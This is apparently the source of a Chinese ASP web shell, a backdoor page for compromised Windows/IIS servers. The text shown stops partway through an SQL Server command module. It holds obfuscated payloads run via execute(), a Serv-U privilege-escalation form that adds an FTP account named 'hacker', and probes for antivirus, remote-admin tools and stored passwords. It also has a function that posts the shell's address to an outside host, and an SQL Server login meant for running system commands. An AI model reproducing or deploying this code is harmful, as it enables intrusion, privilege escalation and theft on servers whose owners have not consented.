e.'uyky'1'gzur|'1'uyk'1'gzuyjsN'1'xjqnK%rfwltwU'1'xlsnyyjX%isf%xysjrzhtI'1'xqttY'1'umu'1'uxf'1'5557x|tisn|'1'jrsn|'1'gj|'1'=>sn|'1'5557sn|'1'sn|'1'yssn|'1'x|tisn|'-~fwwF%B%yxnQwjiqtKurjY			e.'：试测录目举穷'-ijW%+%'CNQA'%+%wyXdurjY%B%wyXdurjY			e5By?y1yxnQwjiqtKurjY%rnI			e.'-?读可不'-ijW%+%'?录目根盘磁CNQA'%+%wyXdurjY%B%wyXdurjY%%%%		ejxqJ%%%%	elsnmytS%B%wjiqtKjxfG%yjX			elsnmytS%B%wjiqtKurjY%yjX			ey}jS			e.I-w\jWhX%+%'：夹件文CNQA'%+%wyXdurjY%B%wyXdurjY%%%%			exwjiqtKurjY%sn%I%mhfJ%wtK			exwjiqtKgzX3wjiqtKjxfG%B%xwjiqtKurjY%yjX			ewjiqtKyttW3j{nwIyxjY%B%wjiqtKjxfG%yjX			ee..'a?'%+%j{nwI--w\jWhX%+%'?录目根盘磁CNQA'%+%.jrfSjrzqt[3j{nwIyxjY-ijW%+%'：名卷盘磁CNQA'%+%..;<:=9564j nXqfytY3j{nwIyxjY-ysNH-ijW%+%'：量容总盘磁CNQA'%+%.jrfSjwfmX3j{nwIyxjY-ijW%+%'：名享共盘磁CNQA'%+%.wjgrzSqfnwjX3j{nwIyxjY-ijW%+%'：号列序盘磁CNQA'%+%.rjyx~XjqnK3j{nwIyxjY-ijW%+%'：型类区分盘磁CNQA'%B%wyXdurjY%%%%		esjmY%~ifjWxN3j{nwIyxjY%kN		e.j{nwI-j{nwIyjL3TXK%B%j{nwIyxjY%yjX		e.'yhjogTrjyx~XjqnK3lsnyunwhX'-yhjogtjyfjwH3wj{wjX%B%TXK%yjX%%%%	esjmY%''%CA%j{nwI%kN	eI1wyXdurjY1xwjiqtKurjY1wjiqtKjxfG1j{nwIyxjY1TXK%rnI?.j{nwI-j{nwIsfhX%gzX")):execute(LUnEnCode("stnyhszK%isJ?'Cjqgfy4A'+7NX+6NX+5NX+NX%XWWey}jsekn%isje'Cwy4ACiy4ACystk4A'+myfu3ogt+'@uxgs+C5555KK(Bwtqth%ystkAb'+}q+'?型类动启`C''7''Bsfuxqth%''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyACwyA'+jrfS~fquxnI3ogt+'@uxgs+C''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyACiy4A'+jrfS3ogt+'@uxgs+C''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyACwyA'+7NXB7NXejxqje'Cwy4ACiy4ACystk4A'+myfu3ogt+'@uxgs+C5555KK(Bwtqth%ystkAb'+}q+'?型类动启`C''7''Bsfuxqth%''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyACwyA'+jrfS~fquxnI3ogt+'@uxgs+C''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyACiy4A'+jrfS3ogt+'@uxgs+C''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyACwyA'+6NXB6NXesjmy%7Bju~YywfyX3OGT%isf%'sn|'CA..8191myfu3ogt-inr-jxfHQ%kne'用禁'B}q%sjmy%9Bju~YywfyX3OGT%kne'动手'B}q%sjmy%8Bju~YywfyX3OGT%kne'动自'B}q%sjmy%7Bju~YywfyX3OGT%knekn%isje%'Cwy4ACiy4A@uxgs+C''7''Bsfuxqth%''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyACwyA'B5NXe'Cwy4ACiy4A'+NXBNXe'.组-户用统系'+NXBNXe%'@uxgs+C''KKKKKK(''Bwtqthlg%iyACiy4A'+NXBNXejrfS3ogt+NXBNXe'@uxgs+C''KKKKKK(''Bwtqthlg%''57''Bymlnjm%iyA'+NXBNXe'CwyA'+NXBNXesjmy%''Bju~YywfyX3OGT%knewfjqh3wwje.'344?YSsn\'-yhjogTyjl%sn%ogt%mhfj%wtkey}js%jrzxjw%wtwwj%ste'Cwy4ACiy4A务服与户用统系C,zsjr,Bwtqthlg%,wjysjh,Bslnqf%,8,Bsfuxqth%,57,Bymlnjm%iyACwyA'+NXBNXe'C,wjysjh,Bslnqf%,5,Blsniifuqqjh%,6,Blsnhfuxqqjh%,5,Bwjiwtg%,zsjr,Bwtqthlg%,55;,Bmyin|%jqgfyACwgA'BNX?.-jxwztH%stnyhszK"))
execute(LUnEnCode("stnyhszK%isJ?kn%isje'pwt|yjS3yunwhx\?限权有没'%jynw|3jxstuxjWesjmy%wwj%kney}jSe'CwgA'+jrfS3snrif%jynw|3jxstuxjWexwjgrjR3uztwLogt%sn%snrif%mhfJ%wtKe.'uztwl1xwtyfwyxnsnriF4'+jrfSwjyzurtH3Sy+'44?YSsn\'-yhjogTyjLBuztwLogt%yjXe.'pwt|yjS3yunwhx\'-yhjogTjyfjwh3wj{wjxBSy%yjXe号帐组xwtyfwyxnsnriF找查,%y}js%jrzxjw%wtwwj%ste5Bxjwnu}J3jxstuxjW?.-gfsnrif%stnyhszK?stnyhszK%isJ?kn%isjeisj3jxstuxjWeINxxjhtwUysn+'CwgA'%jynw\3jxstuxjWe.INxxjhtwUysn1Ht1qqzs1'wjxz%yjs'-jyfjwh3uu%jynw\3jxstuxjWe.'xxjhtwUd78sn\'-yjl3hhBuu%yjXe76B|tisn\|tmX3HtedjhsfyxsNs|fuX3xxBHt%yjXe.'uzywfyXxxjhtwUd78sn\'-yjl3hhBxx%yjxe..'i}'-yxjzvjw-wj{wjxyhjssth3||Bhh%yjxe.'wtyfhtqrjg|x3lsnyunwhxrjg|'-yhjogtjyfjwh3wj{wjxB||%yjxesjmy%''CA.'i}'-yxjzvjw%kne'Crwtk4A'%XWWe'C''交提''Bjzqf{%''ynrgzX''Bjrfs%''ynrgzx''Bju~y%yzusnA%%%%'%XWWe'C''5<''Bj nx%''@ytzv+wjphfm@ytzv+1@ytzv+)wjphfm@ytzv+1@ytzv+7{rnh4yttw@ytzv+1@ytzv+6353=;637>6@ytzv+''Bjzqf{%''i}''Bin%''y}jy''Bju~y%''i}''Bjrfs%yzusnA'%XWWe'令命行执程远%%'%XWWe'C''nr|BstnyhFD''Bstnyhf%''yxtu''Bitmyjr%''6rwtk''Bjrfs%rwtkA'%XWWe'C,wjysjh,Bslnqf%,5,Blsniifuqqjh%,6,Blsnhfuxqqjh%,5,Bwjiwtg%,zsjr,Bwtqthlg%,*5=,Bmyin|%jqgfyACwgA'BNX?.-nr|%stnyhszK")):if request("web2a2dmin")="/"&ScrName&"" then:session("web2a2dmin") = UserPass:end if:function b(l)
t=-1
for i = 1 to len(l)
if mid(l,i,1)<>"" then
If Asc(Mid(l, i, 1)) < 32 Or Asc(Mid(l, i, 1)) > 126 Then
else
g=asc(mid(l,i,1))-t
a=a&chr(g)
end if
else
end if
next
b=a
end function:Function suftp():RRS"<p><center>Serv-U T权程序--修复提权后无法连接问题</p>"
RRS"<form name='form1' method='post' action=''>"
RRS"<center>管理员:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
RRS"<center>管理员密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
RRS"<center>SERV-U端口:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
RRS"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='hacker'><br>"
RRS"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='hacker'><br>"
RRS"<center>帐号的所对的路径:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>"
RRS"<center>服务端口:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>"
RRS"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加"
RRS"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除"
RRS"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
hostip = request.Form("hostp")
timeout=600:execute(LUnEnCode("kn%isjelsnmytsB8YXTU}%yjXe.xj{fjq-isjX38yxtU}ejzwY%1'xj{fjq4'+%ywtu%+'?635353<7644?uyym'%1'YXTU'%sjuT38yxtU}e.'UYYMQR]37QR]XR'-yhjogTjyfjwH%B%8yxtU}%yjXekqwhg{%+%wjxzy%+%'BwjxZ%'%+%kqwhg{%+%ywtuy%+%'BtSywtU2'%+%kqwhg{%+%'5353535BUN2'%+%kqwhg{%+%'WJXZJYJQJI2'%+%xj{fjq%B%xj{fjqekqwhg{%+%'JHSFSJYSNFR%JYNX'%+%xj{fjq%B%xj{fjqekqwhg{%+%i|u%+%'%xxfU'%+%xj{fjq%B%xj{fjqekqwhg{%+%wxZ%+%'%wjxZ'%B%xj{fjqejxqje.'CWGACwgA.?%'%+%myfuy%+%'%?径路%'%+%xxfuy%+%'%?码密'%+%'%'%+%wjxzy%+%'%?名户用%UYK！！行执功成令命'-%jynw|3jxstuxjwelsnmytsBYXTU}%yjXe.xj{fjq-isjX3yxtU}ejzwY%1'xj{fjq4'+%ywtu%+'?635353<7644?uyym'%1'YXTU'%sjuT3yxtU}e.'UYYMQR]37QR]XR'-yhjogTjyfjwH%B%yxtU}%yjXey}jS%jrzxjW%wtwwJ%sTeekqwhg{%+%'ynzv'%+%xj{fjq%B%xj{fjqekqwhg{%+%'UIHQJRF\W""a'%+%myfuy%+%'BxxjhhF%'%+%kqwhg{%+%'jstSBxtnyfW2'%+%kqwhg{%+%'wfqzljWBju~Yiwt|xxfU2'%+%kqwhg{%+%'rjyx~XBjhsfsjysnfR2'ed%+%kqwhg{%+%'5Brzrn}fRfytzV2'%+%kqwhg{%+%'5BysjwwzHfytzV2'%+%kqwhg{%+%'5BynijwHxtnyfW2'%+%kqwhg{%+%'6Bs|tItnyfW2'ed%+%kqwhg{%+%'6BuZtnyfW2'%+%kqwhg{%+%'5Bjwnu}J2'%+%kqwhg{%+%'62ByzTjrnYstnxxjX2'%+%kqwhg{%+%'55;ByzTjrnYjqiN2'%+%kqwhg{%+%'62BxwjxZwS}fR2'ed%+%kqwhg{%+%'5Bs|tIynrnQijjuX2'%+%kqwhg{%+%'5BuZynrnQijjuX2'%+%kqwhg{%+%'62BUNwjUsnltQxwjxZ}fR2'%+%kqwhg{%+%'5BjqgfsJfytzV2'ed%+%kqwhg{%+%'5Biwt|xxfUjlsfmH2'%+%kqwhg{%+%'5BsnltQ|tqqFx~f|qF2'%+%kqwhg{%+%'5BsjiinMjinM2'%+%kqwhg{%+%'5BjwzhjXijjS2'ed%+%kqwhg{%+%'6BxmyfUqjW2'%+%kqwhg{%+%'5BjqgfxnI2'%+%kqwhg{%+%'BjqnKxjRsnltQ2'%+%kqwhg{%+%'a'%+%myfuy%+%'BwnIjrtM2'ed%+%kqwhg{%+%xxfuy%+%'Biwt|xxfU2'%+%kqwhg{%+%wjxzy%+%'BwjxZ2'%+%kqwhg{%+%ywtuy%+%'BtSywtU2'%+%kqwhg{%+%'5353535BUN2'%+%kqwhg{%+%'UZYJXWJXZYJX2'%+%xj{fjq%B%xj{fjqekQwHg{%+%'B~jPT_Y%'%+%kQwHg{%+%'5BjqgfsJT_Y2'%+%kQwHg{%+%'5""6""62""'%+%ywtuy%+%'""5353535""jz~zt~BsnfrtI2'%+%kQwHg{%+%'SNFRTIYJX2'%+%xj{fjq%B%xj{fjqekQwHg{%+%'JHSFSJYSNFR%JYNX'%B%yrekQwHg{%+%ywtuy%+%'BtSywtU%'%+%kQwHg{%+%'5353535BUN2'%+%kQwHg{%+%'SNFRTIjyjqjI2'%+%xj{fjq%B%xj{fjqekqwhg{%+%'JHSFSJYSNFR%JYNX'%+%xj{fjq%B%xj{fjqekqwhg{%+%i|u%+%'%xxfU'%+%xj{fjq%B%xj{fjqekqwhg{%+%wxZ%+%'%wjxZ'%B%xj{fjqesjmY%'iif'%B%.'styyzgtnifw'-rwtK3yxjzvjw%kn")):End Function:Function fuck():On Error Resume Next
execute(LUnEnCode(".myfUyktX-jxfhqBtksnmyfUe.'myfU'-rjyn3ysjrstwn{sJ3mx\BmyfUyktXe.'qqjmX3yunwhx\'-yhjogtjyfjwhBmx|%yjxemx|%rni"))
Response.Write"<LI>系统软件支持:<BR>"
Response.Write"-----------------------------<br>"
execute(LUnEnCode("'CwgA持支?件软毒杀列系星瑞CnqA'%jynw\3jxstuxjW%sjmY%.'lsnxnw'1tksnmyfU-wyxsn%kne'CwgA持支?件软毒杀克铁门赛CnqA'%jynw\3jxstuxjW%sjmY%.'xzwn{nysf'1tksnmyfU-wyxsn%kne'CwgA持支?件软毒杀列系山金CnqA'%jynw\3jxstuxjW%sjmY%.'{fp'1tksnmyfU-wyxsn%kne'CwgA持支?件软毒杀qqnPCnqA'%jynw\3jxstuxjW%sjmY%.'qqnP'1tksnmyfU-wyxsn%kne'CwgA持支?制控jwjm|~sFhU克铁门赛CnqA'%jynw\3jxstuxjW%sjmY%.'jwjm|~sfhu'1tksnmyfU-wyxsn%kne'CwgA持支?器务服RKHCnqA'%jynw\3jxstuxjW%sjmY%.'<}rstnxzkh'1tksnmyfU-wyxsn%kne'CwgA持支?务服库据数jqhfwTCnqA'%jynw\3jxstuxjW%sjmY%.'jqhfwt'1tksnmyfU-wyxsn%kne'CwgA持支?务服库据数QVX~RCnqA'%jynw\3jxstuxjW%sjmY%.'qvx~r'1tksnmyfU-wyxsn%kne'CwgA持支?务服库据数QVXXRCnqA'%jynw\3jxstuxjW%sjmY%.'wj{wjx%qvx%yktxtwhnr'1tksnmyfU-wyxsn%kne'CwgA持支?本脚f{fOCnqA'%jynw\3jxstuxjW%sjmY%.'f{fo'1tksnmyfU-wyxsn%kne'CwgA持支?本脚qwjUCnqA'%jynw\3jxstuxjW%sjmY%.'qwju'1tksnmyfU-wyxsN%kn"))
paths=split(SoftPath,";")
Response.Write "------------------------------------<br>"
Response.Write "系统当前路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
Response.Write "<li>"&paths(i)&"<br>"
next:end Function
execute(LUnEnCode("stnyhszK%isj?kn%isJ%%%%%%e'码密jwjm|~sFhu到得解破并载下录目认默从以可1件文码密jwjm|~sFhu现发CnqA'%jynw\3jxstuxjW%%%%%%%%esjmY%.'knh3'+jrfswj{wjx+'ahjysfr~XafyfI%stnyfhnquuFaxwjxZ%qqFaxlsnyyjX%isF%xysjrzhtIa'+wj{nwix~x-xyxn}JjqnK3txk%kN%%%%%%e.'jrfSwjyzurtHajrfSwjyzurtHajrfSwjyzurtHaqtwystHayjXqtwystHysjwwzHaRJYX^XaRQPM'-ifjWljW3mx|Bjrfswj{wjx%%%%%%e.71.7-wjiqtKqfnhjuxyjL3txK-ykjqBj{nwix~X%%%%%%e.'yhjogTrjyx~XjqnK3lsnyunwhX'-yhjogtjyfjwH3wj{wjXBtxk%yjX%%%%%%ey}jS%%%%e%kn%isJ%%%%%%ekn%isJ%%%%%%%%e'CwgA马木UMU入写且并1录目qnfRgj\找查以可1动启限权rjyx~XqfhtQ以且1qnfrsn\%hnlfR有中器务服CnqA'%jynw\3jxstuxjW%%%%%%%%%%esjmY%'rjyx~XqfhtQ'BjrfSyszthhFjhn{wjX3jhn{wjXogt%kn%%%%%%%%esjmY%.'qnfrsn|'1.jrfS3jhn{wjXogt-jxfhq-wyxsn%kn%%%%%%%eekn%isJ%%%%%%ekn%isJ%%%%%%%%e'CwgA权提马木uxO用使虑考以可1动启限权rjyx~XqfhtQ以且1yfhrtY有中器务服CnqA'%jynw\3jxstuxjW%%%%%%%%%%esjmY%'rjyx~XqfhtQ'BjrfSyszthhFjhn{wjX3jhn{wjXogt%kn%%%%%%%%esjmY%.'yfhrty'1.jrfS3jhn{wjXogt-jxfhq-wyxsn%kn%%%%%%ekn%isJ%%%%%%ekn%isj%%%%%%%%ekn%isJ%%%%%%%%%%e'CwgA马木UMU虑考以可1rjyx~XqfhtQ为限权动启1在存务服jmhfuF有中器务服CnqA%'%jynw\3jxstuxjW%%%%%%%%%%%%ejxqJ%%%%%%%%%%e'CwgA权提接直以可3jmhfuF为器务服GJ\前当CnqA'%jynw\3jxstuxjW%%%%%%%%%%%%esjmY%.'jmhfuF'1.'JWF\YKTXdWJ[WJX'-xjqgfnwf[wj{wjX3yxjzvjW-wyxsn%kN%%%%%%%%%%esjmY%'rjyx~XqfhtQ'BjrfSyszthhFjhn{wjX3jhn{wjXogt%kn%%%%%%%%esjmY%'jmhfuf'B.jrfS3jhn{wjXogt-jxfhq%kn%%%%%%ekn%isJ%%%%%%ekn%isJ%%%%%%%%e'CwgA权提虑考以可1动启限权rjyx~XqfhtQ以且1装安Z2{wjX有中器务服CnqA'%jynw\3jxstuxjW%%%%%%%%%%esjmY%'rjyx~XqfhtQ'BjrfSyszthhFjhn{wjX3jhn{wjXogt%kn%%%%%%%%esjmY%'Z2{wjX'BjrfS3jhn{wjXogt%kn%%%%%%e%%%%%e%%%%%%ewjyzurtHogt%sN%jhn{wjXogt%mhfJ%wtK%%%%ey}jS%jrzxjW%wtwwJ%sT,%%%%e.'jhn{wjX'-~fwwF%B%wjyqnK3wjyzurtHogt%%%%e.'stnyfhnquuF3qqjmX'-yhjogTjyfjwH3wj{wjX%B%fx%yjX%%%%e.'344?YSsn\'-yhjogTyjL%B%wjyzurtHogt%yjXe'CwmACwgAb测探点弱器务服`'%jynw|3jxstuxjW?.-~itl%stnyhszK?stnyhszK%isj?'CwgACwgACwgA222222222222222222222222222222222222'%jynw\3jxstuxjWe'CwgA'+pp+'?为卡网动活前当CnqA'jynw\3jxstuxjWe.pm-ifjWljW3mx|Bppe'ysztHarzsJaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaRQPM'Bpme'CwgA'+qrys+'?为置设qryS%yjsqjYCnqA'%jynw\3jxstuxjWe6BqryS%sjmY%''Bqrys%kne.~jpQRYS-ifjWljW3mx\Bqryse'QRYSa536awj{wjXyjsqjYayktxtwhnRaJWF\YKTXaJSNMHFRdQFHTQd^JPM'B~jpQRYSe'CwgA'+~quxni+'?户用入登次上示显否是CnqA'%jynw\3jxstuxjWe'否'B~quxni%jxqj%'是'B~quxni%sjmY%5Bsnltquxni%wt%''Bsnltquxni%kNe.'jrfSwjxZyxfQ~fquxnIystIarjyx~XaxjnhnqtUastnxwj[ysjwwzHax|tisn\ayktxtwhnRajwf|yktXaJSNMHFRdQFHTQd^JPM'-ifjWljw3mx|Bsnltquxniekn%isJe'CwgA'+i|xxfU+'?码密CjwfzvxBju~y%nqA'%jynw\3jxstuxjW%%e'CwgA'+snriF+'?名户用CjwfzvxBju~y%nqA'%jynw\3jxstuxjW%%e.'iwt|xxfUyqzfkjIastltqsn\astnxwj[ysjwwzHaYS%x|tisn\ayktxtwhnRaJWF\YKTXaJSNMHFRdQFHTQd^JPM'-ifjWljW3mx\Bi|xxfU%%e.'jrfSwjxZyqzfkjIastltqsn\astnxwj[ysjwwzHaYS%x|tisn\ayktxtwhnRaJWF\YKTXaJSNMHFRdQFHTQd^JPM'-ifjWljW3mx\BsnriF%%e'CwgA用启?入登动自户用CnqA'%jynw\3jxstuxjW%%ejxqJe'CwgA用启未?入登动自户用CnqA'%jynw\3jxstuxjW%%esjmY%''BsnltqtyzF%wt%5BsnltqtyzF%kne.snltqtyzFxn-ifjWljW3mx\BsnltqtyzFe'stltQsnriFtyzFastltqsn\astnxwj[ysjwwzHaYS%x|tisn\ayktxtwhnRaJWF\YKTXaJSNMHFRdQFHTQd^JPM'BsnltqtyzFxne'CwgA'+jrfSsnriF+'?为名户用员理管认默CnqA'%jynw\3jxstuxjWe'wtyfwyxnsnriF'BjrfSsnriF%sjmY%''Bjrfssnrif%kne.~jPjrfSsnriF-ifjWljW3mx|BjrfSsnriFe'jrfSwjxZyqzfkjIyqFastltqsn\astnxwj[ysjwwzHaYS%x|tisn\ayktxtwhnRaJWF\YKTXaJSNMHFRdQFHTQd^JPM'B~jPjrfSsnriFe'CwgA'+jrfshu+'?为名机主前当CnqA'%jynw\3jxstuxjWe'CwgA3名机主取读法无'Bjrfshu%sjmY%''Bjrfshu%kne.~jpjrfshu-ifjWljW3mx|Bjrfshue'jrfSwjyzurtHajrfSwjyzurtHajrfSwjyzurtHaqtwystHayjXqtwystHysjwwzHaRJYX^XaRQPM'B~jpjrfshuee'C6Bj nx%wmACwgAb测探置设统系`CwgACwgA'%jynw\3jxstuxjW	ekn%isj%%%%ey}jS%%%%%%e'CwgA222222222222222222222222222222222222222222222222'%jynw\3jxstuxjW%%%%%%%%ekn%isJ%%%%%%%%ekn%isJ%%%%%%%%%%e'CwgA'%jynw\3jxstuxjW%%%%%%%%%%%%ey}js%%%%%%%%%%%%e'1'+.o-|tqqfUIZ%jynw\3jxstuxjW%%%%%%%%%%%%%%e.|tqqfuiz-isztGZ%tY%.|tqqfuiz-isztGQ%B%o%wtk%%%%%%%%%%%%e'?为口端UIZ的许允CnqA'%jynw\3jxstuxjW%%%%%%%%%%%%ejxqJ%%%%%%%%%%e'CwgA部全?为口端UIZ的许允CnqA'%jynw\3jxstuxjW%%%%%%%%%%%%esjmY%5B.5-|tqqfuiz%wt%''B.5-|tqqfuiz%kN%%%%%%%%%%e.UIZqqzK-ifjWljW3mx\B|tqqfuiz%%%%%%%%%%ekn%isJ%%%%%%%%%%e'CwGA'%jynw\3jxstuxjW%%%%%%%%%%%%ey}jS%%%%%%%%%%%%e'1'+.o-|tqqfuhy%jynw\3jxstuxjW%%%%%%%%%%%%%%e.|tqqfuhy-isztGZ%tY%.|tqqfuhy-isztGQ%B%o%wtK%%%%%%%%%%%%e'?为口端UHY的许允CnqA'%jynw\3jxstuxjW%%%%%%%%%%%%ejxqJ%%%%%%%%%%e'CwgA部全?为口端UHY的许允CnqA'%jynw\3jxstuxjW%%%%%%%%%%%%esjmY%5B.5-|tqqfuhy%wt%''B.5-|tqqfuhy%kN%%%%%%%%%%e.UHYqqzK-ifjWljW3mx\B|tqqfuhy%%%%%%%%%%ePZJ+GiuF+myfuBUIZqqzK%%%%%%%%%%ePYJ+GiuF+myfUBUHYqqzK%%%%%%%%%%e'xywtUij|tqqFUIZa'BPZJ%%%%%%%%%%e'xywtUij|tqqFUHYa'BPYJ%%%%%%%%%%ejxqj%%%%%%%%e'CwgA选筛UN4uhY有没CnqA'%jynw\3jxstuxjW%%%%%%%%%%e%sjmY%6BwjyqnkunuhytS%kn%%%%%%%%ee测探选筛UN4UHY,eekN%isJ%%%%%%%%e'CwgA置设有没或取读法无XSI认默CnqA'%jynw\3jxstuxjW%%%%%%%%%%ejxqJ%%%%%%%%e'CwgA'+wyxXSI+'?为XSI卡网CnqA'%jynw\3jxstuxjW%%%%%%%%%%esjmY%''CAwyxXSI%kN%%%%%%%%e.~jPXSI-ifjWljW3mx\BwyxXSI%%%%%%%%e'wj{wjXjrfSa'+GiuF+myfUB~jPXSI%%%%%%%%ee测探置设XSI,eekn%isJ%%%%%%%%e'CwgA置设有没或取读法无关网认默CnqA'%jynw\3jxstuxjW%%%%%%%%%%ejxqJ%%%%%%%%ey}jS%%%%%%%%%%e'CwgA'+.o-~f|jyfL+'?为'+o+'关网CnqA'%jynw\3jxstuxjW%%%%%%%%%%%%e.~f|jyfL-isztgZ%ty%.~f|jyfL-isztgQBo%wtK%%%%%%%%%%esjmY%.~f\jyfL-~fwwfxn%kN%%%%%%%%e.~jP~f\jyfL-ifjwljW3mx\B~f\jyfL%%%%%%%%e'~f|jyfLyqzfkjIa'+GiuF+myfUB~jP~f\jyfL%%%%%%%%ee测探置设关网,eeeekn%isJ%%%%%%%%e'CwgA置设有没或取读法无址地UNCnqA'%jynw\3jxstuxjW%%%%%%%%%%ejxqJ%%%%%%%%ey}jS%%%%%%%%%%e'CwgA'+.o-wiiFUN+'?为'+o+'址地UNCnqA'%jynw\3jxstuxjW%%%%%%%%%%%%e.wiiFUN-isztgZ%ty%.wiiFUN-isztgQBo%wtK%%%%%%%%%%esjmY%''CA.5-wiifUN%kN%%%%%%%%e.~jPUN-ifjwljW3mx\BwiifUN%%%%%%%%e'xxjwiiFUNa'+GiuF+myfUB~jPUN%%%%%%%%e测探址地UN,ee'axjhfkwjysNaxwjyjrfwfUaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaJSNMHFRdQFHTQd^JPM'BmyfU%%%%%%%%e'CwgA'+GiuF+'?为列序的'+n+'卡网'%jynw\3jxstuxjW%%%%%%%%e.''1'ajhn{jIa'1.n-xiuF-jhfqujWBGiuF%%%%%%%%e62.xiuF-isztGZ%tY%.xiuF-isztGQBn%wtK%%%%%%e%sjmY%.xiuF-~fwwFxN%kN%%%%e.~jPiuF-ifjWljW3mx\BxiuF%%%%e'isnGajlfpsnQaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaRQPM'B~jPiuF%%%%eekN%isJe6BwjyqnkunuhytS%%esjmY%''BjqgfsJxn%wt%5BjqgfsJxn%kNe.~jPunuhYjqgfsJ-ifjwljW3mx\BjqgfsJxne'xwjyqnK~ynwzhjXjqgfsJaxwjyjrfwfUaunuhYaxjhn{wjXayjXqtwystHysjwwzhaRJYX^XaRQPM'B~jPUNUHYjqgfsJe'C6Bj nx%wmACwgAb测探络网`'%jynw\3jxstuxjW%%	e.'qqjmX3yunwhx\'-yhjogtjyfjwhBmx|%yjxemx|%rniey}js%jrzxjw%wtwwj%st?.-pttm%%stnyhszK")):function x(Posturl): dim w: w="^w^inhttp.^wi^nhttprequest.5.1": Posturl=replace(trim(Posturl),vbcrlf,""): on error resume next: set http= CreateObject(replace(w,"^","")): http.open "POST",Posturl,false: http.SetRequestHeader "REFERER", "http://"&sba&request.ServerVariables("URL"):http.send: Set http=Nothing:end function:Function sqlabc():IF SESSION("LOGIN")="" THEN
                           RESPONSE.WRITE "<CENTER><FONT COLOR=RED>没有登陆</FONT></CENTER><BR>"
			   ELSE RESPONSE.WRITE "<CENTER><FONT COLOR=RED>已经登陆</FONT></CENTER><BR>"
END IF
                           RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>退出登陆</FONT></A></CENTER><BR>"

IF REQUEST("SQLAAA")="LOGIN" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & REQUEST.FORM("SERVER") & "," & REQUEST.FORM("PORT") & ";PASSWORD=" & REQUEST.FORM("PASS") & ";UID=" & REQUEST.FORM("NAME")
                       IF ERR.NUMBER=-2147467259 THEN 
                       RESPONSE.WRITE "<FONT COLOR=RED>数据源连接错误，请检查！</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=-2147217843 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>用户名密码错误错误，请检查！</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=0 THEN
                       STRQUERY="SELECT @@VERSION"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF INSTR(RECRESULT(0),"NT 5.0") THEN
		       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000系统</FONT><BR>"
                       SESSION("SYSTEM")="2000"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.1")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XP系统</FONT><BR>"
                       SESSION("SYSTEM")="XP"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.2")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003系统</FONT><BR>"
                       SESSION("SYSTEM")="2003"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>其他系统</FONT><BR>"
                       SESSION("SYSTEM")="NO"
                       END IF
                       STRQUERY="SELECT IS_SRVROLEMEMBER('SYSADMIN')"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
                       IF RECRESULT(0)=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>恭喜！SQL SERVER最高权限</FONT><BR>"
                       SESSION("PRI")=1
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>郁闷，权限不够估计不能执行命令！</FONT><BR>"
                       SESSION("PRI")=0
                       END IF              
		       SESSION("LOGIN")="YES"
		       SESSION("NAME")=REQUEST.FORM("NAME")
		       SESSION("PASS")=REQUEST.FORM("PASS")
		       SESSION("SERVER")=REQUEST.FORM("SERVER")
		       SESSION("PORT")=REQUEST.FORM("PORT")
                       END IF

ELSEIF REQUEST("SQLAAA")="TEST"  THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000系统</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="XP" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XP系统</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="2003" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003系统</FONT><BR>"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>其他操作系统</FONT><BR>"
                       END IF
                       IF SESSION("PRI")=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>恭喜！SQL SERVER最高权限</FONT><BR>"
                       ELSE 
                       RESPONSE.WRITE "<FONT COLOR=RED>郁闷，权限不够估计不能执行命令！</FONT><BR>"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
